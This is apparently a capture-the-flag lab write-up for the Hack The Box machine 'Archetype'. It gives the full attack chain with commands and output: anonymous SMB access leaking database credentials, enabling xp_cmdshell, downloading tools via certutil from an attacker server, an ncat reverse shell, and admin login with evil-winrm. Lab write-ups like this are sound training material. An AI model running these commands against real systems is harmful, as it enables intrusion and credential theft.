# Archetype
#HTB #very-easy #SQL #SMB #databases #networks-services #authentication #privilege-escalation #evil-winrm #reverse-shell #ncat
## Target:
*Name:* Archetype
*IP:* 10.129.133.41
## Vulnerability:
- Anonymous login enabled on SMB shares, exposing sensitive plain text information.
- `sql_svc` database user had `sysadmin` privileges, which allowed us to enable `xp_cmdshell` and execute OS commands.
- Administrator credentials found in plaintext in the PowerShell history file, allowing full privilege escalation.
## Steps:
#### 1) Reconnaissance
**Code:**
```
nmap -sV 10.129.133.41
```
**Result:**
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-01 10:37 -0400
Nmap scan report for 10.129.133.41
Host is up (0.020s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.84 seconds
```
The target is a Windows machine, and it runs multiple services:
- **MSRPC = Microsoft Remote Procedure Call (135):** It's a protocol that allows a program on one computer to execute code/functions on another computer over a network, as if it were a local call
- **NetBIOS Session Service (139)**: it's the older way SMB used to work. Before Microsoft moved SMB to run directly over TCP (port 445), it ran on top of NetBIOS on port 139.
- **Port 445:** SMB.
- **MSSQL (Microsoft SQL Server) (1433):** Microsoft's relational database server, version 2017.
- **Port 5985**: WinRM (Windows Remote Management)
#### 2) Attempt SMB null session 
**Code:**
```
smbclient -L //10.129.133.41 -N
```
**Result:**
```

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.133.41 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
After enumerating available shares, we discovered a non-default share: `backups`.
#### 3) Connecting to `backups` workgroup
**Code:**
```
smbclient //10.129.133.41/backups -N
```
**Result:**
```
Try "help" to get a list of possible commands.
smb: \> 
```
We successfully connected anonymously. 
#### 4) Viewing available files
**Full process:**
```
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

5056511 blocks of size 4096. 2617027 blocks available

smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)

smb: \> ^C

┌──(____________)-[~]
└─$ cat prod.dtsConfig         
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=<PASSWORD>;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```
The file contains plain credentials for database connection:
*Username:* `sql_svc`
*Password:* `<PASSWORD>`
#### 5) Connecting to the database
To connect to the MSSQL database, we can use `mssqlclient.py` utility from `Impacket` collection.

> [!NOTE]
*Impacket is a collection of Python scripts/libraries for working with network protocols, specifically focused on Windows networking protocols like SMB, MSRPC, MSSQL, Kerberos, etc.*

**Code:**
```
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:<PASSWORD>@10.129.133.41 -windows-auth
```
**Result:**
```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> 
```
#### 6) Executing commands on the target machine using MSSQL
Microsoft SQL Server has `xp_cmdshell` procedure that allows you to execute **Windows operating system commands** directly from within SQL Server.
We tried to run `whoami` command:
```
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'whoami';
ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL (ARCHETYPE\sql_svc  dbo@master)> 
```
But `xp_cmdshell` is disabled. We can try to enable it:
```
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure "xp_cmdshell", 1;
INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'whoami';
output              
-----------------   
archetype\sql_svc   
NULL                
SQL (ARCHETYPE\sql_svc  dbo@master)> 
```
We successfully enabled `xp_cmdshell`, confirming that `sql_svc` has **sysadmin** privileges on the SQL Server, a low-privilege service account should never be able to modify server configuration. 
#### 7) WinPEAS
We now need to perform privilege escalation, and instead of searching each file for a misconfiguration, we can automate it using `winPEAS`. 
Firstly, we need to download the program to the target machine, since it will run on it.
We'll install it on our machine:
```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
```
Then we'll open a server:
```
python3 -m http.server 8000
```
so we can send `winPEAS` to the target machine:
```
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.15.37:8000/winPEASx64.exe C:\Users\sql_svc\Downloads\winPEASx64.exe';
output                                                
---------------------------------------------------   
****  Online  ****                                    
CertUtil: -URLCache command completed successfully.   
NULL                                                  
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'dir C:\Users\sql_svc\Downloads\';
output                                                  
-----------------------------------------------------   
 Volume in drive C has no label.                        
 Volume Serial Number is 9565-0B4F                      
NULL                                                    
 Directory of C:\Users\sql_svc\Downloads                
NULL                                                    
08/01/2026  09:16 AM    <DIR>          .                
08/01/2026  09:16 AM    <DIR>          ..               
08/01/2026  09:16 AM        11,166,720 winPEASx64.exe   
               1 File(s)     11,166,720 bytes           
               2 Dir(s)  10,695,344,128 bytes free      
NULL
```
As we can see, `winPEAS` successfully downloaded on the target machine.
#### 8) Reverse shell using `ncat` (method found on HackTricks)
`ncat` is same as `netcat`, it's just a modernized, improved version developed by the Nmap project. 
It can also be useful for performing a reverse shell on a windows machine, using `ncat.exe` executable.
We'll start with installing the packages:

**ncat for Linux machine:**
```
sudo apt install ncat
```
**ncat executable for windows machine:**
```
wget https://nmap.org/dist/ncat-portable-5.59BETA1.zip
```
Then, we'll download `ncat.exe` on the target machine, using our python server on port 8000:
```
EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.15.37:8000/ncat.exe C:\Users\sql_svc\Downloads\ncat.exe';
```
Next, we'll open a listener on port 1337:
```
ncat -l 1337
```
Finally, we'll run `ncat.exe` on the target machine:
```
EXEC xp_cmdshell 'C:\Users\sql_svc\Downloads\ncat.exe 10.10.15.37 1337 -e "cmd.exe /c (cmd.exe  2>&1)"';
```
**Result:**
```
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
#### 9) Privilege escalation
We used `winPEAS` to search for possible misconfigurations that allow privilege escalation:
**Code:**
```
.\winPEASx64.exe
```
**Important result:**

<img width="981" height="163" alt="image" src="https://github.com/user-attachments/assets/f5f1cc7e-bf0a-45b1-8f55-9b6413825517" />

One of the first highlighted findings is the powershell history file:
**Content of `ConsoleHost_history.txt`**
```
net.exe use T: \\Archetype\backups /user:administrator <PASSWORD2>
```
We found the password for administrator user: `<PASSWORD2>`
#### 10) Searching for flags
**User flag:**
```
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\

01/20/2020  05:20 AM    <DIR>          backups
07/27/2021  02:28 AM    <DIR>          PerfLogs
07/27/2021  03:20 AM    <DIR>          Program Files
07/27/2021  03:20 AM    <DIR>          Program Files (x86)
01/19/2020  11:39 PM    <DIR>          Users
07/27/2021  03:22 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  10,672,283,648 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users

01/19/2020  04:10 PM    <DIR>          .
01/19/2020  04:10 PM    <DIR>          ..
01/19/2020  11:39 PM    <DIR>          Administrator
01/19/2020  11:39 PM    <DIR>          Public
01/20/2020  06:01 AM    <DIR>          sql_svc
               0 File(s)              0 bytes
               5 Dir(s)  10,672,283,648 bytes free

C:\Users>cd sql_svc
cd sql_svc

C:\Users\sql_svc>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\sql_svc

01/20/2020  06:01 AM    <DIR>          .
01/20/2020  06:01 AM    <DIR>          ..
01/20/2020  06:01 AM    <DIR>          3D Objects
01/20/2020  06:01 AM    <DIR>          Contacts
01/20/2020  06:42 AM    <DIR>          Desktop
01/20/2020  06:01 AM    <DIR>          Documents
08/02/2026  01:14 AM    <DIR>          Downloads
01/20/2020  06:01 AM    <DIR>          Favorites
01/20/2020  06:01 AM    <DIR>          Links
01/20/2020  06:01 AM    <DIR>          Music
01/20/2020  06:01 AM    <DIR>          Pictures
01/20/2020  06:01 AM    <DIR>          Saved Games
01/20/2020  06:01 AM    <DIR>          Searches
01/20/2020  06:01 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  10,672,283,648 bytes free

C:\Users\sql_svc>cd Desktop
cd Desktop

C:\Users\sql_svc\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\sql_svc\Desktop

01/20/2020  06:42 AM    <DIR>          .
01/20/2020  06:42 AM    <DIR>          ..
02/25/2020  07:37 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,672,283,648 bytes free

C:\Users\sql_svc\Desktop>type user.txt
type user.txt
<USER_FLAG>
```
**Root flag:**
As nmap revealed `winRM` is running on the machine, we can use `evil-winrm` to connect to the machine as administrator:
**Code:**
```
evil-winrm -i 10.129.133.41 -u Administrator -p '<PASSWORD2>'
```
**Result**
```
Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
**Full process:**
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        7/27/2021   2:30 AM                3D Objects
d-r---        7/27/2021   2:30 AM                Contacts
d-r---        7/27/2021   2:30 AM                Desktop
d-r---        7/27/2021   2:30 AM                Documents
d-r---        7/27/2021   2:30 AM                Downloads
d-r---        7/27/2021   2:30 AM                Favorites
d-r---        7/27/2021   2:30 AM                Links
d-r---        7/27/2021   2:30 AM                Music
d-r---        7/27/2021   2:30 AM                Pictures
d-r---        7/27/2021   2:30 AM                Saved Games
d-r---        7/27/2021   2:30 AM                Searches
d-r---        7/27/2021   2:30 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/25/2020   6:36 AM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
<ROOT_FLAG>
```
## Flags:
[Not disclosed — solve it yourself!]
## Key takeaway:
Accounts may have admin privileges by accident, which is a major misconfiguration.
